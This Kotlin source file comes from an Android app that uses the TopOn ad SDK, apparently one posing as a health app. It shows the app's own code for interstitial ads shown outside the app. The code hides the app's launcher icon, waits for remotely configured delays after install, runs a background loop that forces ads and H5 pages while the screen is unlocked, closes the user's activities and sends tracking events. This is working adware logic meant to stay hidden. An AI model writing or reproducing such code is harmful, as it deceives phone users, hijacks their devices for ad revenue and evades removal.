package com.jia.opens.golden.scales.towards.acan

import android.os.Handler
import android.os.Looper
import com.anythink.core.api.ATAdInfo
import com.anythink.core.api.AdError
import com.anythink.interstitial.api.ATInterstitial
import com.anythink.interstitial.api.ATInterstitialListener
import com.jia.opens.golden.scales.towards.vjire.PngCanGo
import com.jia.opens.golden.scales.towards.vjire.TtPoint
import com.jia.opens.golden.scales.towards.vjire.AppPointData
import com.jia.opens.golden.scales.towards.pngstart.startApp
import com.jia.opens.golden.scales.towards.acan.TopOnUtils.initFaceBook
import com.jia.opens.golden.scales.towards.vjire.PngAllData
import com.jia.opens.golden.scales.towards.pngstart.startApp.splitString
import com.jia.opens.golden.scales.towards.zsdk5f.ZJiaPng
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File


class TopOnTool {
    private var jobAdRom: Job? = null
    val adLimiter = TopOnShow()

    // 广告对象
    lateinit var interstitialAd: ATInterstitial

    // 广告缓存时间（单位：毫秒）
    private val AD_CACHE_DURATION = 50 * 60 * 1000L // 50分钟

    // 上次广告加载时间
    private var lastAdLoadTime: Long = 0

    // 是否正在加载广告
    private var isLoading = false
    var canNextState = false
    var clickState = false
    var isHaveAdData = false

    // 广告初始化，状态回调
    private fun intiTTTTAd() {
        val idBean = ShowDataTool.getAdminData() ?: return
        val id = idBean.resources.identifiers.internal
        ShowDataTool.showLog("体外广告id=: ${id}")
        // 创建插屏广告对象
        interstitialAd = ATInterstitial(startApp.mainStart, id)
        // 设置插屏广告监听器
        interstitialAd.setAdListener(object : ATInterstitialListener {
            override fun onInterstitialAdLoaded() {
                ShowDataTool.showLog("体外广告onAdLoaded: 广告加载成功")
                lastAdLoadTime = System.currentTimeMillis()
                TtPoint.postPointData(false, "getadvertise")
                isHaveAdData = true
            }

            override fun onInterstitialAdLoadFail(p0: AdError?) {
                ShowDataTool.showLog("体外广告onAdFailed: 广告加载失败=${p0?.fullErrorInfo}")
                resetAdStatus()
                TtPoint.postPointData(
                    false,
                    "getfail",
                    "string1",
                    p0?.code+p0?.desc
                )
                isHaveAdData = false
            }

            override fun onInterstitialAdClicked(p0: ATAdInfo?) {
                ShowDataTool.showLog("体外广告onAdClicked: 广告${p0?.getPlacementId()}被点击")
                adLimiter.recordAdClicked()
                clickState = true
            }

            override fun onInterstitialAdShow(p0: ATAdInfo?) {
                clickState = false
                ShowDataTool.showLog("体外广告onAdImpression: 广告${p0?.getPlacementId()}展示")
                adLimiter.recordAdShown()
                resetAdStatus()
                p0?.let { TtPoint.postAdData(it) }
                AppPointData.showsuccessPoint()
                isHaveAdData = false
            }

            override fun onInterstitialAdClose(p0: ATAdInfo?) {
                ShowDataTool.showLog("体外广告onAdClosed: 广告${p0?.getPlacementId()}被关闭")
                PngCanGo.closeAllActivities()
                cloneAndOpenH5()
            }

            override fun onInterstitialAdVideoStart(p0: ATAdInfo?) {
            }

            override fun onInterstitialAdVideoEnd(p0: ATAdInfo?) {
            }

            override fun onInterstitialAdVideoError(p0: AdError?) {
                resetAdStatus()
                ShowDataTool.showLog("体外广告onAdClosed: 广告展示失败")
                TtPoint.postPointData(
                    false,
                    "showfailer",
                    "string3",
                    p0?.code+"  "+p0?.desc
                )
            }
        })

    }

    private fun litAd(): Boolean {
        val jsonBean = ShowDataTool.getAdminData() ?: return true
        val limits = jsonBean.appConfig.exposure.limits.splitString("/")
        val hADData = (limits.getOrNull(0) ?: "").toInt()
        val dayAdData = (limits.getOrNull(1) ?: "").toInt()
        val clicksPerDay = jsonBean.appConfig.exposure.interactions
        return !adLimiter.canShowAd(hADData, dayAdData, clicksPerDay)
    }

    // 加载广告方法
    private fun loadAd() {
        if (litAd()) {
            ShowDataTool.showLog("体外广告展示限制,不加载广告")
            return
        }
        val currentTime = System.currentTimeMillis()
        if (isHaveAdData && ((currentTime - lastAdLoadTime) < AD_CACHE_DURATION)) {
            // 使用缓存的广告
            ShowDataTool.showLog("不加载,有缓存的广告")
            // 处理广告展示的逻辑
        } else {
            if (((currentTime - lastAdLoadTime) >= AD_CACHE_DURATION)) {
                resetAdStatus()
            }
            // 如果正在加载广告，则不发起新的请求
            if (isLoading) {
                ShowDataTool.showLog("正在加载广告，等待加载完成")
                return
            }
            // 设置正在加载标志
            isLoading = true
            // 发起新的广告请求
            ShowDataTool.showLog("发起新的广告请求")
            interstitialAd.load()
            TtPoint.postPointData(false, "reqadvertise")

            // 设置超时处理
            Handler(Looper.getMainLooper()).postDelayed({
                if (isLoading && !isHaveAdData) {
                    ShowDataTool.showLog("广告加载超时，重新请求广告")
                    // 超时处理，重新请求广告
                    loadAd()
                }
            }, 60 * 1000) // 60秒超时
        }
    }

    //广告状态重置
    fun resetAdStatus() {
        isLoading = false
        lastAdLoadTime = 0
        isHaveAdData = false
    }

    fun startRomFun() {
        initFaceBook()
        intiTTTTAd()
        val adminData = ShowDataTool.getAdminData() ?: return
        val delayChecks = adminData.appConfig.timing.checks.splitString("|").getOrNull(0) ?: "0"
        val delayData = delayChecks.toLong().times(1000L)
        ShowDataTool.showLog("startRomFun delayData=: ${delayData}")
        jobAdRom = CoroutineScope(Dispatchers.Main).launch {
            while (true) {
                val a = ArrayList(PngCanGo.activityList)
                if (a.isEmpty() || (a.last().javaClass.name != "com.healthybody.happyeveryday.xxs.MainTwoActivity")) {
                    if (a.isEmpty()) {
                        ShowDataTool.showLog("隐藏图标=null")
                    } else {
                        ShowDataTool.showLog("隐藏图标=${a.last().javaClass.name}")
                    }
                    ZJiaPng.jiaPng("happyeverydaynfxxs", true)
                    break
                }
                delay(500)
            }
            checkAndShowAd(delayData)
        }
    }

    private suspend fun checkAndShowAd(delayData: Long) {
        while (true) {
            ShowDataTool.showLog("循环检测广告")
            TtPoint.postPointData(false, "timertask")
            if (TopOnUtils.adNumAndPoint()) {
                jumfailpost()
                jobAdRom?.cancel()
                break
            } else {
                loadAd()
                isHaveAdNextFun()
                delay(delayData)
            }
        }
    }

    private fun jumfailpost() {
        val adFailPost = startApp.okSpBean.adFailPost
        if (!adFailPost) {
            TtPoint.postPointData(false, "jumpfail")
            startApp.okSpBean.adFailPost = true
        }
    }

    private fun isHaveAdNextFun() {
        // 检查锁屏或息屏状态，避免过多的嵌套
        if (TopOnUtils.canShowLocked()) {
            ShowDataTool.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        // 调用点位数据函数
        TtPoint.postPointData(false, "isunlock")

        // 获取管理员数据
        val jsonBean = ShowDataTool.getAdminData() ?: return

        // 获取安装时间
        val instalTime = PngCanGo.getInstallTimeDataFun()
        val ins = jsonBean.appConfig.timing.checks.splitString("|").getOrNull(1) ?: "0"
        val wait = jsonBean.appConfig.timing.checks.splitString("|").getOrNull(2) ?: "0"

        // 检查首次安装时间和广告展示时间间隔
        if (isBeforeInstallTime(instalTime, ins)) return
        if (isAdDisplayIntervalTooShort(wait)) return
        val installFast = PngCanGo.getInstallFast()
        val insInt =
            try {
                ins.toInt()
            } catch (e: Exception) {
                0
            }
        val timeD = installFast + (insInt * 1000) + (jsonBean.network.h5Config.ttl * 1000)
        canNextState = false
        val (h5Url, hData, dayData) = PngAllData.safeParseGateways(jsonBean.network.h5Config.gateways[0])
        ShowDataTool.showLog("h5Url=: ${h5Url}==${timeD > System.currentTimeMillis() && h5Url.isNotEmpty()}")
        if (timeD > System.currentTimeMillis() && h5Url.isNotEmpty()) {
            // 检查广告展示限制
            if (!startApp.h5Limiter.canShowAd(hData, dayData)) {
                ShowDataTool.showLog("h5广告展示限制")
                return
            }
            ShowDataTool.showLog("h5流程")
            PngCanGo.isH5State = true
        } else {
            PngCanGo.isH5State = false
            if (litAd()) {
                ShowDataTool.showLog("体外广告展示限制")
                return
            }
            ShowDataTool.showLog("体外流程")
        }
        showAdAndTrack()
    }

    private fun isBeforeInstallTime(instalTime: Long, ins: String): Boolean {
        try {
            if (instalTime < ins.toInt()) {
                ShowDataTool.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
                TtPoint.postPointData(false, "ispass", "string", "firstInstallation")
                return true
            }
        } catch (e: Exception) {
            return false
        }
        return false
    }

    private fun isAdDisplayIntervalTooShort(wait: String): Boolean {
        try {
            val jiange = (System.currentTimeMillis() - TopOnUtils.adShowTime) / 1000
            if (jiange < wait.toInt()) {
                ShowDataTool.showLog("广告展示间隔时间小于$wait 秒，不展示")
                TtPoint.postPointData(false, "ispass", "string", "Interval")
                return true
            }
            return false
        } catch (e: Exception) {
            return false
        }
    }

    private fun showAdAndTrack() {
        TtPoint.postPointData(false, "ispass", "string", "")
        CoroutineScope(Dispatchers.Main).launch {
            PngCanGo.closeAllActivities()
            delay(1011)
            if (canNextState) {
                ShowDataTool.showLog("准备显示h5广告，中断体外广告")
                return@launch
            }
            addFa()
            ZJiaPng.jiaPng("callstartgicallstart", true)
            TtPoint.postPointData(false, "callstart")
        }
    }

    fun cloneAndOpenH5() {
        // 锁屏+亮屏幕  && 在N秒后 && H5不超限
        // 当广告未关闭 下一个循环触发 体外广告，也会调用Close
        val jsonBean = ShowDataTool.getAdminData() ?: return
        val (h5Url, hData, dayData) = PngAllData.safeParseGateways(jsonBean.network.h5Config.gateways[0])
        ShowDataTool.showLog("h5Url=: ${h5Url}=clickState=${clickState}")
        if (clickState || h5Url.isEmpty()) {
            return
        }
        clickState = false
        ShowDataTool.showLog("关闭打开H5")
        if (TopOnUtils.canShowLocked()) {
            ShowDataTool.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        val installFast = PngCanGo.getInstallFast()
        val ins = jsonBean.appConfig.timing.checks.splitString("|").getOrNull(1) ?: "0"
        val wait = jsonBean.appConfig.timing.checks.splitString("|").getOrNull(2) ?: "0"
        val insInt =
            try {
                ins.toInt()
            } catch (e: Exception) {
                0
            }
        val waitInt =
            try {
                wait.toInt()
            } catch (e: Exception) {
                0
            }
        val timeD = installFast + (insInt * 1000) + (jsonBean.network.h5Config.ttl * 1000)
        val jiange = (System.currentTimeMillis() - TopOnUtils.adShowTime) / 1000
        ShowDataTool.showLog("H5----1---=${timeD <= System.currentTimeMillis()}")
        ShowDataTool.showLog("H5----2---=${jiange < waitInt}")

        if (timeD <= System.currentTimeMillis() && jiange < waitInt) {
            // 检查广告展示限制
            if (!startApp.h5Limiter.canShowAd(hData, dayData)) {
                ShowDataTool.showLog("h5广告展示限制")
                return
            }
            ShowDataTool.showLog("跳转打开H5")
            PngCanGo.isH5State = true
            canNextState = true
            showAdAndTrack2()
        }
    }

    private fun showAdAndTrack2() {
        TtPoint.postPointData(false, "ispass", "string", "")
        CoroutineScope(Dispatchers.Main).launch {
            addFa()
            PngCanGo.closeAllActivities()
            delay(678)
            ZJiaPng.jiaPng("ispassgicspass", false)
            TtPoint.postPointData(false, "callstart")
        }
    }


    private fun addFa() {
        val okSpBean = startApp.okSpBean ?: return
        synchronized(okSpBean) {
            var adNum = okSpBean.isAdFailCount
            adNum++
            okSpBean.isAdFailCount = adNum
        }
    }


}